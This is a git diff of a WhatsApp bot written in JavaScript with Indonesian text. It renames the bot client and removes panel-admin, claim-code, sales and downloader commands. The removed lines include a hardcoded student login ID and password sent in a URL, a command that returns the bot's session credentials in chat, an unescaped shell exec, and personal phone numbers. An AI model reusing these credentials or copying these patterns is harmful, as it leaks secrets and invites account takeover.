-        das.groupParticipantsUpdate(m.chat, [sender], 'remove');
+        kayla.groupParticipantsUpdate(m.chat, [sender], 'remove');
       }
     }
-    // =_=_=_=_=_=_=_=_=_=_=_  ANTI WA ME_=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
-    if (m.isGroup && !m.key.fromMe && !isOwner && antiwame) {
+
+    if (m.isGroup && !m.key.fromMe && !itsMeKayla && antiwame) {
       if (!isBotAdmins) return;
       if (budy.match(`wa.me`)) {
-        das.sendMessage(
+        kayla.sendMessage(
           m.chat,
           {
             text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`,
           },
           { quoted: m }
         );
-        das.groupParticipantsUpdate(m.chat, [sender], 'remove');
+        kayla.groupParticipantsUpdate(m.chat, [sender], 'remove');
       }
     }
 
@@ -1261,14 +1380,14 @@ END:VCARD`,
     ) {
       var get_data_respon = getDataResponList(m.chat, chath, db_respon_list);
       if (get_data_respon.isImage === false) {
-        das.sendMessage(
+        kayla.sendMessage(
           m.chat,
           { text: sendResponList(m.chat, chath, db_respon_list) },
           { quoted: m }
         );
       } else {
         buff = await getBuffer(get_data_respon.image_url);
-        das.sendImage(m.chat, buff, `${get_data_respon.response}`, m);
+        kayla.sendImage(m.chat, buff, `${get_data_respon.response}`, m);
       }
     }
 
@@ -1279,14 +1398,14 @@ END:VCARD`,
     if (!isCmd && isAlreadykaylaList(chath, dblist)) {
       var getkaydata = getDatakaylaList(chath, dblist);
       if (getkaydata.isImage === false) {
-        das.sendMessage(
+        kayla.sendMessage(
           m.chat,
           { text: sendkaylaList(chath, dblist) },
           { quoted: m }
         );
       } else {
         buff = await getBuffer(getkaydata.image_url);
-        das.sendImage(m.chat, buff, `${getkaydata.response}`, m);
+        kayla.sendImage(m.chat, buff, `${getkaydata.response}`, m);
       }
     }
 
@@ -1312,639 +1431,18 @@ END:VCARD`,
       },
     ];
     const listMenuMessage = {
-      text: `Silahkan  pilih list menu di bawah ini !!! @${
+      text: `Silahkan Kak @${
         sender.split('@')[0]
-      }\n\n`,
+      } Pencet Button List Message Nya Di Bawah Ya`,
       mentions: [sender],
-      footer: footer,
-      buttonText: ' COMMANDS 💎',
+      footer: fake,
+      buttonText: '🪀 COMMANDS 🪀',
       sections: seactions,
       listType: 1,
     };
-    // reply(JSON.stringify(m, null, 2));
-    // =_=_=_=_=_=_=_=_=_=_=_ COMMAND_=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
 
     switch (command) {
-      // =_=_=_=_=_=_=_=_=_=_=_=_=_=   CASE PTERODACTYL PANEL =_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_
-      case 'getallserver':
-        if (!isCreator) return reply('Kamu siapa?');
-        // if (!q) return reply(`contoh : ${prefix + command} 1`);
-        await panel
-          .getAllServers()
-          .then((result) => {
-            reply(JSON.stringify(result.data, null, 2));
-          })
-          .catch((err) => {
-            reply(JSON.stringify(err, null, 2));
-          });
-        break;
-
-      case 'getalluserpanel':
-        if (!isCreator) return reply('Kamu siapa?');
-        if (!q) return reply(`contoh : ${prefix + command} page(int)`);
-        await panel
-          .getAllUsers(Number(args[0]))
-          .then((result) => {
-            let usersPanel = `*Total : ${result.data.length}*\n==================\n\n`;
-            result.data.map((user) => {
-              usersPanel += `*Username :* ${user.attributes.username}\n*Email :* ${user.attributes.email}\n*ID :* ${user.attributes.id}\n\n`;
-            });
-            // console.log(usersPanel);
-            reply(usersPanel);
-          })
-          .catch((err) => {
-            reply(JSON.stringify(err, null, 2));
-          });
-        break;
-      case 'getuserdetail':
-        if (!isCreator) return reply('Kamu siapa?');
-        if (!q) return reply(`contoh : ${prefix + command} id berapa?`);
-        await panel
-          .getUserDetails(Number(args[0]))
-          .then((result) => {
-            reply(JSON.stringify(result.attributes, null, 2));
-          })
-          .catch((err) => {
-            reply(JSON.stringify(err, null, 2));
-          });
-        break;
-      case 'getuserbyusername':
-        if (!isCreator) return reply('Kamu siapa?');
-        if (!q) return reply(`contoh : ${prefix + command} username?`);
-        await panel
-          .getUserByUsername(args[0])
-          .then((result) => {
-            reply(JSON.stringify(result.attributes, null, 2));
-          })
-          .catch((err) => {
-            reply(JSON.stringify(err, null, 2));
-          });
-        break;
-      case 'getuserbyemail':
-        if (!isCreator) return reply('Kamu siapa?');
-        if (!q) return reply(`contoh : ${prefix + command} email`);
-        await panel
-          .getUserByEmail(args[0])
-          .then((result) => {
-            reply(JSON.stringify(result.attributes, null, 2));
-          })
-          .catch((err) => {
-            reply(JSON.stringify(err, null, 2));
-          });
-        break;
-      case 'deleteserver':
-        if (!isCreator) return reply('Kamu siapa?');
-        if (!q) return reply(`contoh : ${prefix + command} id server`);
-        await panel
-          .deleteServer(args[0])
-          .then((result) => {
-            reply(JSON.stringify(result, null, 2));
-          })
-          .catch((err) => {
-            reply(JSON.stringify(err, null, 2));
-          });
-        break;
-      case 'deleteuserpanel':
-        if (!isCreator) return reply('Kamu siapa?');
-        if (!q) return reply(`contoh : ${prefix + command} id`);
-        await panel
-          .deleteUser(args[0])
-          .then((result) => {
-            reply(JSON.stringify(result, null, 2));
-          })
-          .catch((err) => {
-            reply(JSON.stringify(err, null, 2));
-          });
-        break;
-
-      case 'getserverdetails':
-        if (!isCreator) return reply('Kamu siapa?');
-        if (!q) return reply(`contoh : ${prefix + command} id server`);
-        await panel
-          .getServerDetails(args[0])
-          .then(async (result) => {
-            console.log(result.id);
-            server = result;
-            reply(
-              `*== [ DETAILS SERVER ] ==*\n\nID: ${server.id}\nNAME: ${
-                server.name
-              }\nAllocation: ${server.allocation}\nNAME: ${
-                server.name
-              }\nDESCRIPTION: ${server.description}\nMEMORY: ${
-                server.limits.memory === 0 ? 'Unlimited' : server.limits.memory
-              } MB\nDISK: ${
-                server.limits.disk === 0 ? 'Unlimited' : server.limits.disk
-              } MB\nCPU: ${server.limits.cpu}%\nCREATED AT: ${
-                server.created_at
-              }\nEXPIRED : 1 Bulan\n\n`
-            );
-          })
-          .catch((err) => {
-            console.log(err);
-            reply(JSON.stringify(err, null, 2));
-          });
-
-        break;
-      case 'updateserver':
-        {
-          if (!isCreator) return reply('Kamu siapa?');
-          let s = q.split(',');
-          if (s.length < 4)
-            return m.reply(
-              `Perintah :\n${prefix + command} id server,ram,cpu,disk`
-            );
-          let id = s[0];
-          let ram = s[1];
-          let cpu = s[2];
-          let disk = s[3];
-
-          await panel.getServerDetails(id).then(async (result) => {
-            // reply(JSON.stringify(result, null, 2));
-            console.log(result.id);
-            let allocationID = result.allocation;
-
-            await panel
-              .updateServerBuild(
-                id,
-                allocationID,
-                ram,
-                0,
-                50,
-                cpu,
-                disk,
-                null,
-                0,
-                0,
-                0
-              )
-              .then(async (response) => {
-                reply(JSON.stringify(response, null, 2));
-              })
-              .catch((err) => {
-                console.log(err);
-                reply(JSON.stringify(err, null, 2));
-              });
-          });
-        }
-        break;
-
-      case 'createserver':
-        {
-          if (!isCreator) return reply('Kamu siapa?');
-          let s = q.split(',');
-          if (s.length < 6)
-            return m.reply(
-              `Perintah :\n${prefix + command} name,usrId,memory,disk,cpu,desc`
-            );
-          let name = s[0];
-          let usr_id = s[1];
-          let memory = s[2];
-          let disk = s[3];
-          let cpu = s[4];
-          let desc = s[5] || '';
-
-          let allocation = 0;
-          //console.log(data.attributes.startup)
-          let startup_cmd =
-            'git clone {{GIT_ADDRESS}} ./; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; if [ /home/container/{{JS_FILE}} ]; then /usr/local/bin/node /home/container/{{JS_FILE}}; fi;';
-          await panel.getAllServers().then((result) => {
-            allocation += result.data.length;
-            console.log(result.data.length);
-          });
-          let json = {
-            name: name,
-            description: desc,
-            user: usr_id,
-            egg: 15,
-            docker_image: 'ghcr.io/parkervcp/yolks:nodejs_16',
-            startup: startup_cmd,
-            environment: {
-              USER_UPLOAD: '0',
-              JS_FILE: 'index.js',
-              NODE_PACKAGES: '',
-              USERNAME: '',
-              ACCESS_TOKEN: '',
-              UNNODE_PACKAGES: '',
-              STARTUP: startup_cmd,
-              P_SERVER_LOCATION: 'sgp',
-            },
-            limits: {
-              memory: memory,
-              swap: 0,
-              disk: disk,
-              io: 500,
-              cpu: cpu,
-            },
-            feature_limits: {
-              databases: 0,
-              backups: 0,
-            },
-            allocation: {
-              default: allocation + 1,
-              // additional: [20],
-            },
-          };
-
-          let server = new ServerBuilder(json)
-            .createServer(panel)
-            .then(async (response) => {
-              server = response.attributes;
-              reply(
-                `*== [ SUKSES MEMBUAT SERVER ] ==*\n\nID: ${server.id}\nNAME: ${
-                  server.name
-                }\nDESCRIPTION: ${server.description}\nMEMORY: ${
-                  server.limits.memory === 0
-                    ? 'Unlimited'
-                    : server.limits.memory
-                } MB\nDISK: ${
-                  server.limits.disk === 0 ? 'Unlimited' : server.limits.disk
-                } MB\nCPU: ${server.limits.cpu}%\nCREATED AT: ${
-                  server.created_at
-                }\nEXPIRED : 1 Bulan\n\n`
-              );
-
-              console.log(
-                `SERVER HAS BEEN CREATED\n\n` +
-                  JSON.stringify(response.attributes, null, 2)
-              );
-            })
-            .catch((err) => {
-              reply(JSON.stringify(err, null, 2));
-            });
-        }
-        break;
-
-      case 'createuserpanel':
-        if (!isCreator) return reply('Kamu siapa?');
-        if (!q)
-          return reply(
-            `contoh : ${
-              prefix + command
-            } Email, Username, FirstName, LastName, Password`
-          );
-        let newUser = q.split(',');
-        await panel
-          .createUser(
-            newUser[0].trim(),
-            newUser[1].trim(),
-            newUser[2].trim(),
-            newUser[3].trim(),
-            newUser[4].trim()
-          )
-          .then((result) => {
-            // reply(JSON.stringify(result.attributes, null, 2));
-            reply(JSON.stringify(result, null, 2));
-          })
-          .catch((err) => {
-            reply(JSON.stringify(err, null, 2));
-          });
-        break;
-      case 'createtrialserver':
-        if (!isCreator) return reply('Kamu siapa?');
-        {
-          if (!q)
-            return m.reply(`Perintah :\n ${prefix + command} id_owner|name`);
-
-          let allocation = 0;
-          //console.log(data.attributes.startup)
-          let startup_cmd =
-            'git clone {{GIT_ADDRESS}} ./; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; if [ /home/container/{{JS_FILE}} ]; then /usr/local/bin/node /home/container/{{JS_FILE}}; fi;';
-          await panel.getAllServers().then((result) => {
-            allocation = result.data.length;
-            console.log(result.data.length);
-          });
-          let json = {
-            name: q2,
-            description: '',
-            user: q1,
-            egg: 15,
-            docker_image: 'ghcr.io/parkervcp/yolks:nodejs_16',
-            startup: startup_cmd,
-            environment: {
-              USER_UPLOAD: '0',
-              JS_FILE: 'index.js',
-              NODE_PACKAGES: '',
-              USERNAME: '',
-              ACCESS_TOKEN: '',
-              UNNODE_PACKAGES: '',
-              STARTUP: startup_cmd,
-              P_SERVER_LOCATION: 'sgp',
-            },
-            limits: {
-              memory: 512,
-              swap: 0,
-              disk: 1024,
-              io: 500,
-              cpu: 30,
-            },
-            feature_limits: {
-              databases: 0,
-              backups: 0,
-            },
-            allocation: {
-              default: allocation + 1,
-              // additional: [20],
-            },
-          };
-          reply(allocation);
-          let server = new ServerBuilder(json)
-            .createServer(panel)
-            .then(async (response) => {
-              server = response.attributes;
-              reply(
-                `*== [ SUKSES MEMBUAT SERVER ] ==*\n\nID: ${server.id}\nNAME: ${
-                  server.name
-                }\nDESCRIPTION: ${server.description}\nMEMORY: ${
-                  server.limits.memory === 0
-                    ? 'Unlimited'
-                    : server.limits.memory
-                } MB\nDISK: ${
-                  server.limits.disk === 0 ? 'Unlimited' : server.limits.disk
-                } MB\nCPU: ${server.limits.cpu}%\nCREATED AT: ${
-                  server.created_at
-                }\nEXPIRED : 1 Bulan\n\n`
-              );
-
-              console.log(
-                `SERVER HAS BEEN CREATED\n\n` +
-                  JSON.stringify(response.attributes, null, 2)
-              );
-            })
-            .catch((err) => {
-              reply(JSON.stringify(err, null, 2));
-            });
-        }
-        break;
-
-      // =_=_=_=_=_=_=_=_=_=_=_=_=_=  END CASE PTERODACTYL PANEL =_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_
-
       // =_=_=_=_=_=_=_=_=_=_=_=_=_=   CASE DIKY =_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_
-
-      case 'addcodeclaim':
-        if (!isOwner) return reply(mess.owner);
-        if (!q) return reply(`Example : ${prefix + command} code|type`);
-        _claim.push({
-          code: q1,
-          type: q2,
-        });
-        fs.writeFileSync('./database/claim.json', JSON.stringify(_claim));
-        reply(`Success add code *${q1}* & type *${q2}* to database`);
-        break;
-
-      case 'claim':
-        if (!q) return reply(`Example : ${prefix + command} code`);
-        let cekCode = _claim.find((v) => v.code == args[0]);
-        if (cekCode == undefined) return reply(`Code *${args[0]}* not found`);
-        if (cekCode.type == 'owner') {
-          // let cekwa = await onWhatsApp(sender);
-          owner.push(sender);
-          fs.writeFileSync(
-            './database/ownerNumber.json',
-            JSON.stringify(owner)
-          );
-          reply(`Success add ${sender} as owner`);
-        } else if (cekCode.type == 'premium') {
-          prem.push(sender);
-          fs.writeFileSync('./database/premium.json', JSON.stringify(prem));
-          reply(`Nomor *${sender}* Telah Menjadi Premium!`);
-        }
-
-        // delete code
-        _claim.splice(_claim.indexOf(cekCode), 1);
-        fs.writeFileSync('./database/claim.json', JSON.stringify(_claim));
-        console.log('code claimed');
-        break;
-      case 'ceksession':
-        if (!isOwner) return reply(mess.owner);
-        reply(fs.readFileSync('./session/creds.json', 'utf-8'));
-        break;
-      case 'updatesession':
-        if (!isOwner) return reply(mess.owner);
-        if (!q) return reply(`Example : ${prefix + command} session`);
-
-        fs.writeFileSync('./session/creds.json', JSON.stringify(q));
-        reply(`Session has been updated to ${q}`);
-        break;
-      case 'ocr':
-        if (!quoted)
-          return reply(
-            `Kirim/Reply gambar dengan Caption ${prefix + command}\n`
-          );
-        if (/image/.test(mime)) {
-          let media = await das.downloadAndSaveMediaMessage(quoted, 'ocr');
-
-          exec(`tesseract ${media} temporary/ocr`, async (err, stdout) => {
-            if (err) return reply(`${err}`);
-            // if (stdout) {
-            txt = fs.readFileSync('./temporary/ocr.txt', 'utf-8').trim();
-            let encmedia = reply(txt);
-            await sleep(1000);
-            // await fs.unlinkSync('temporary/ocr.txt');
-            await fs.unlinkSync(media);
-            console.log('OCR  SUCCESS');
-            console.log(stdout);
-            // }
-          });
-        } else {
-          reply(`Kirim/Reply gambar dengan Caption ${prefix + command}\n`);
-        }
-        break;
-      case 'buypanel':
-      case 'beli':
-        txt = `
-*READY PANEL RUN BOT 24JAM*
-
-🚀 SPEK 1 (15K)
-Ram 2 | CPU 75% 
-  
-🚀 SPEK 2 (25K)
-Ram 4 | Cpu 150%
-  
-🚀 SPEK 3 (40K)
-Ram 7 | Cpu 200%
-  
-  
-🚀 SPEK ga cocok? bs request!
-🚀 SUPPORT GIT CLONE 
-🚀 GARANSI 1 BULAN
-🚀 Bisa LOGIN dulu baru BAYAR
-
-*NEGO? KLIK LINK DI BAWAH*
-  
-
-READY JUGA VPS
-  
-🚀 SPEK 1  25K
-1 Cpu | 2 GB 
-  
-🚀 SPEK 2  45K
-2 Cpu | 4 GB
-  
-🚀 SPEK 3 80k
-4 Cpu | 8 GB
-  
-  
-(1) wa.me/6287765244029?text=*beli%20panel*
-  
-(2) wa.me/625768966412?text=*beli%20panel*
-
-Join grup untuk info lebih lanjut :
-https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
-  `;
-
-        let ment = isGroup ? participants.map((a) => a.id) : [];
-        das.sendMessage(m.chat, { text: txt, mentions: ment }, { quoted: m });
-        das.sendMessage(sender, { text: txt }, { quoted: m });
-        break;
-      case 'button':
-        const templateButtons = [
-          {
-            index: 1,
-            urlButton: {
-              displayText: '⭐ Star Baileys on GitHub!',
-              url: 'https://github.com/adiwajshing/Baileys',
-            },
-          },
-          {
-            index: 2,
-            callButton: {
-              displayText: 'Call me!',
-              phoneNumber: '6285768966412',
-            },
-          },
-          {
-            index: 3,
-            quickReplyButton: {
-              displayText: 'This is a reply, just like normal buttons!',
-              id: 'id-like-buttons-message',
-            },
-          },
-          {
-            index: 4,
-            quickReplyButton: {
-              displayText: 'This is a reply, just like normal buttons!',
-              id: 'id-like-buttons-message',
-            },
-          },
-          {
-            index: 5,
-            quickReplyButton: {
-              displayText: 'This is a reply, just like normal buttons!',
-              id: 'id-like-buttons-message',
-            },
-          },
-          {
-            index: 6,
-            quickReplyButton: {
-              displayText: 'This is a reply, just like normal buttons!',
-              id: 'id-like-buttons-message',
-            },
-          },
-          {
-            index: 7,
-            quickReplyButton: {
-              displayText: 'This is a reply, just like normal buttons!',
-              id: 'id-like-buttons-message',
-            },
-          },
-        ];
-
-        const templateMessage = {
-          text: "Hi it's a template message",
-          footer: 'Hello World',
-          templateButtons: templateButtons,
-        };
-
-        das.sendMessage(from, templateMessage);
-        break;
-
-      case 'khs':
-        if (!q) {
-          q1 = '1914161023';
-          q2 = '562403';
-        }
-        await axios
-          .get('https://pp.semhas.me/khs?npm=' + q1 + '&pw=' + q2)
-          .then((res) => {
-            reply(JSON.stringify(res.data, null, 2));
-          })
-          .catch((err) => {
-            reply('error');
-          });
-        break;
-      case 'instagram ':
-      case 'ig':
-        if (!q)
-          return reply(
-            `Link Nya Kak???\nContoh ${
-              prefix + command
-            } https://www.instagram.com/p/CKXZ1Z1J8ZK/`
-          );
-        let ig = await axios.get(
-          `https://api.diky.my.id/docs/downloader/instagram?url=${args[0]}&apikey=${diky_key}`
-        );
-        console.log(ig);
-        console.log(ig.data);
-        if (!ig.data.status) return reply(ig.data.message);
-        reply('Sedang Mengirim...');
-        ig.data.data.link.map((v) => {
-          sendFile(from, v, { quoted: m });
-        });
-        // sendFile();
-
-        break;
-      case 'tiktok':
-        if (!q)
-          return reply(
-            `Link Nya Kak???\nContoh ${
-              prefix + command
-            } https://vm.tiktok.com/ZSRApJY1K/`
-          );
-        let res = await axios.get(
-          `https://api.diky.my.id/docs/downloader/tiktok?url=${args[0]}&apikey=${diky_key}`
-        );
-        console.log(res);
-        console.log(res.data);
-        if (!res.data.status) return reply(res.data.message);
-        reply('Sedang Mengirim...');
-        das.sendMessage(
-          m.chat,
-          {
-            video: { url: res.data.data.result.watermark },
-            caption: `*WM*`,
-          },
-          { quoted: m }
-        );
-        das.sendMessage(
-          m.chat,
-          {
-            video: { url: res.data.data.result.nowatermark },
-            caption: `*NO WM*`,
-          },
-          { quoted: m }
-        );
-        reply('audio: ' + res.data.data.result.audio);
-
-        break;
-
-      case 'gdrive':
-        if (!q) return reply('Masukkan Link Gdrive !!');
-        res = await axios.get(
-          `https://api.diky.my.id/docs/downloader/gdrive?link=${args[0]}&apikey=${diky_key}`
-        );
-        if (!res.data.status) return reply(res.data.message);
-        reply(JSON.stringify(res.data.data));
-        das.sendMessage(
-          m.chat,
-          {
-            document: { url: res.data.data.link },
-            mimetype: res.data.data.mimetype,
-            fileName: res.data.data.filename,
-          },
-          { quoted: m }
-        );
-        break;
-
       case 'itp':
         if (!q) return reply('Masukkan NPM !!');
         res = await esertifikat(q);
@@ -1979,7 +1477,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
           sections: choiceMessage,
           listType: 1,
         };
-        das.sendMessage(from, listMessage, { quoted: m });
+        kayla.sendMessage(from, listMessage, { quoted: m });
         // sendMenuMessage(listMessage);
         break;
 
@@ -2027,13 +1525,13 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
         break;
 
       case 'ai':
-        if (!isOwner) return reply(mess.owner);
         try {
+          // if (setting.keyopenai === 'ISI_APIKEY_OPENAI_DISINI') return reply('Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file key.json\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys')
           if (!text)
             return reply(
               `Chat dengan AI.\n\nContoh:\n${prefix}${command} Apa itu resesi`
             );
-          das.sendPresenceUpdate('composing', from);
+          kayla.sendPresenceUpdate('composing', from);
           const configuration = new Configuration({
             apiKey: fs.readFileSync('openai.txt', 'utf-8').trim(),
           });
@@ -2107,7 +1605,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             });
 
           await sleep(s);
-          das.sendMessage(
+          kayla.sendMessage(
             m.chat,
             {
               document: {
@@ -2118,7 +1616,6 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             },
             { quoted: m }
           );
-
           await sleep(s);
           await fs.unlinkSync(`result.${args[0]}`);
           console.log('succcess');
@@ -2134,7 +1631,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             m.message.extendedTextMessage.contextInfo.quotedMessage
               .documentMessage.fileName;
 
-          media = await das.downloadAndSaveMediaMessage(
+          media = await kayla.downloadAndSaveMediaMessage(
             quoted,
             (filename = fileName),
             false
@@ -2147,129 +1644,51 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
 
         break;
       case 'self':
-        das.public = false;
+        kayla.public = false;
         m.reply('Succes');
         break;
       case 'public':
-        if (das.public) return reply('Sudah public');
-        das.public = true;
+        kayla.public = true;
         m.reply('Succes');
         break;
 
-      case 'stopjadibot':
-        // if (m.isGroup) return reply(mess.private);
-
-        //BUTTON MESSAGE
-        caption = `*Berhasil stopjadibot*\n\nJika ingin menjadi bot kembali, silahkan klik tombol dibawah ini\n`; // caption
-        let buttonsStopJadibot = [
-          {
-            buttonId: `${prefix}jadibot`,
-            buttonText: { displayText: 'JADIBOT' },
-            type: 1,
-          },
-        ];
-
-        buttonMessage = {
-          location: { jpegThumbnail: ppnyauser },
-          caption: caption,
-          footer: `Created By @${creator.split('@')[0]}\nGrup ${linkGc}`,
-          buttons: buttonsStopJadibot,
-          headerType: 'LOCATION',
-        };
-
-        //BUTTON MESSAGE
-        dir = path.join(__dirname, `./database/jadibot/${sender}`);
-        // reply(dir);
-        let dirExist = await fs.existsSync(dir);
-        console.log(dirExist);
-        if (dirExist) {
-          await rimraf(dir, async (err) => {
-            if (err) return reply('Nomor ini tidak terdaftar sebagai bot!! 1');
-
-            await das.sendMessage(from, buttonMessage, { quoted: m });
-          });
-        } else {
-          return reply('Nomor ini tidak terdaftar sebagai bot!! 2');
-        }
-
-        // } catch (error) {
-        //   reply('Nomor ini tidak terdaftar sebagai bot!!');
-        // }
-
-        break;
-
       // =_=_=_=_=_=_=_=_=_=_=_=_=_=  END CASE DIKY =_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_
-      case 'berhasil_jadi_bot':
-        // if (!itsMe) return;
-        const noSender = sender.split('@')[0].slice(-4);
-        // const currentStatus = await das.fetchStatus(from);
-        let newStatus = `Hi, im BOT => BOT ID : ${noSender})`;
-        await das.updateProfileStatus(newStatus);
 
-        await das
-          .groupAcceptInvite(gcCode)
-          .then((res) => reply(JSON.stringify(res, null, 2)))
-          .catch((err) => reply(JSON.stringify(err, null, 2)));
-        reply('BERHASIL MEMULAI BOT : 200 OK');
-        break;
       case 'jadibot':
         {
-          // if (m.isGroup) return reply(mess.private);
-
-          //BUTTON MESSAGE
-          let caption = `Dalam proses.. tunggu 5 detik..\n\nJika QR tidak muncul, silahkan klik tombol dibawah ini\n`; // caption
-          let buttonsJadibot = [
-            {
-              buttonId: `${prefix}stopjadibot`,
-              buttonText: { displayText: 'STOP JADI BOT' },
-              type: 1,
-            },
-          ];
-
-          let buttonMessage = {
-            location: { jpegThumbnail: ppnyauser },
-            caption: caption,
-            mentions: [sender, creator, mark],
-            footer: `Created By @${
-              creator.split('@')[0]
-            }\nFree Api ${linkRestApi}`,
-            buttons: buttonsJadibot,
-            headerType: 'LOCATION',
-          };
-          await das.sendMessage(from, buttonMessage, { quoted: m });
-          //BUTTON MESSAGE
-          console.log('START RUN JADIBOT');
-          let botPushname = pushname;
-          const runJadibot = await jadibot(das, m, from, botNumber, sender);
+          if (m.isGroup) return reply(mess.private);
+          jadibot(kayla, m, from);
         }
         break;
       case 'listjadibot':
         try {
           let user = [
             ...new Set([
-              ...global.conns.filter((das) => das.user).map((das) => das.user),
+              ...global.conns
+                .filter((kayla) => kayla.user)
+                .map((kayla) => kayla.user),
             ]),
           ];
           te = '*List Jadibot*\n\n';
           for (let i of user) {
-            y = await das.decodeJid(i.id);
+            y = await kayla.decodeJid(i.id);
             te += ' × User : @' + y.split('@')[0] + '\n';
             te += ' × Name : ' + i.name + '\n\n';
           }
-          das.sendMessage(from, { text: te, mentions: [y] }, { quoted: m });
+          kayla.sendMessage(from, { text: te, mentions: [y] }, { quoted: m });
         } catch (err) {
           reply(`Belum Ada User Yang Jadibot`);
         }
         break;
       case 'shutdown':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         reply(`Bye...`);
         await sleep(3000);
         process.exit();
         break;
       case 'owner':
         {
-          const repf = await das.sendMessage(
+          const repf = await kayla.sendMessage(
             from,
             {
               contacts: {
@@ -2280,7 +1699,7 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
             },
             { quoted: m }
           );
-          das.sendMessage(
+          kayla.sendMessage(
             from,
             {
               text: `Hai Kak @${
@@ -2293,50 +1712,12 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
         }
         break;
       case 'menu':
-        const butlocNye = [
-          {
-            buttonId: `${prefix}buypanel`,
-            buttonText: { displayText: 'Buy Panel & VPS' },
-            type: 1,
-          },
-          {
-            buttonId: `${prefix}scbot`,
-            buttonText: { displayText: 'SC BOT FREE' },
-            type: 1,
-          },
-          {
-            buttonId: `${prefix}screstapi`,
-            buttonText: { displayText: 'SC REST API FREE' },
-            type: 1,
-          },
-        ];
-        const buttonLocnya = {
-          location: { jpegThumbnail: ppnyauser },
-          caption: `Hai Kak @${sender.split('@')[0]} 👋\n\nNama ${
-            isOwner ? 'Owner' : 'User'
-          } : ${pushname}\nNomor ${isOwner ? 'Owner' : 'User'} : ${
-            sender.split('@')[0]
-          }\nJumlah User : ${pendaftar.length} Users\nStatus : ${
-            isOwner ? 'Owner' : 'User'
-          }\nStatus Premium : ${
-            isPrem ? 'Premium User' : 'Free User'
-          }\nRuntime Bot : ${runtime(
-            process.uptime()
-          )}\nSpeed Bot : ${latensi.toFixed(4)} 𝘋𝘦𝘵𝘪𝘬\nMode : ${
-            das.public ? 'Public' : 'Self'
-          }\n`,
-          mentions: [sender, botzkayla, mark],
-          footer:
-            `Created By @${botzkayla.split('@')[0]}\nFree Api ${linkRestApi}` +
-            footer,
-          buttons: butlocNye,
-          headerType: 'LOCATION',
-        };
-        const tyds = await das.sendMessage(from, buttonLocnya, {
-          quoted: m,
-        });
-        das.sendMessage(from, listMenuMessage, { quoted: tyds });
-
+        {
+          const tyds = await kayla.sendMessage(from, buttonLocnya, {
+            quoted: m,
+          });
+          kayla.sendMessage(from, listMenuMessage, { quoted: tyds });
+        }
         break;
       case 'allmenu':
         sendKaylaMessage(from, {
@@ -2354,8 +1735,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2373,8 +1754,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2392,8 +1773,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
+              sourceUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
             },
           },
         });
@@ -2411,8 +1792,8 @@ https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q
               containsAutoReply: true,
               mediaType: 1,
               thumbnail: ppnyauser,
-              mediaUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
-              sourceUrl: 'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+              mediaUrl: 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
